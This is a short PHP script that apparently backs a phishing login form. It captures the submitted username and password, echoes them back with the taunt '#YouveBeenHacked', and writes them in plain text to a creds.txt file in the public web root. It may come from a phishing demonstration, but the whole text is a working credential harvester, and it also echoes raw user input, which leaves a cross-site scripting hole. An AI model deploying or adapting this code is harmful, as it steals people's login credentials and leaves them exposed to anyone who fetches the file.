<?php
$logincreds = fopen("/var/www/html/creds.txt", "w") or die("Unable to open file");

echo "I now know your username is ";
echo $_POST['uname'];
echo "<br>And your super secret password is ";
echo $_POST['psw'];
echo "<br>Don't Worry! I've written them to a file called creds.txt in the /var/www/html folder for safe keeping. Thanks! #YouveBeenHacked";

$username=$_POST['uname'];
$password=$_POST['psw'];


fwrite($logincreds, "Username: ");
fwrite($logincreds,$_POST['uname']);
fwrite($logincreds, "\nPassword: ");
fwrite($logincreds,$_POST['psw']);
fclose($logincreds);


?>
